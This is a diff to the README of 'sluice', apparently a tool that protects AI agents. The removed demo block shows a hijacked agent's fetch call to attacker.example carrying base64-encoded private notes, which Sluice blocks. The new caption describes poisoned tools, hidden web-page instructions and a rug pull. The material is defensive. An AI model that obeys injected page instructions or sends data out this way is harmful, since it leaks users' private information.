@@ -11,12 +11,10 @@ agent base64-encodes it first.
 ![Dependencies](https://img.shields.io/badge/runtime%20dependencies-0-brightgreen)
 ![License](https://img.shields.io/badge/license-MIT-green)
 
-```
- STEP 4  The hijacked agent tries to exfiltrate
-  agent  fetch(url="https://attacker.example/collect?d=Q09ORklERU5USUFMIC0gUHJvamVjdCBIYWxjeW9uLiBCb2FyZCBhcHB…")
-  sluice  BLOCK  web/fetch call: arguments contain 22 content fingerprint(s) from private source
-                 notes/read_note (hidden via base64 encoding)
-```
+![sluice demo: a web page hijacks the agent, which tries to send a private note out base64-encoded; Sluice blocks it](https://raw.githubusercontent.com/premm25/sluice/main/docs/demo.gif)
+
+*Real output of `sluice demo`: a poisoned tool is quarantined, a web page's hidden instructions are revealed,
+the hijacked agent's base64-encoded exfiltration is blocked, and a rug pull is caught.*
 
 ---
 
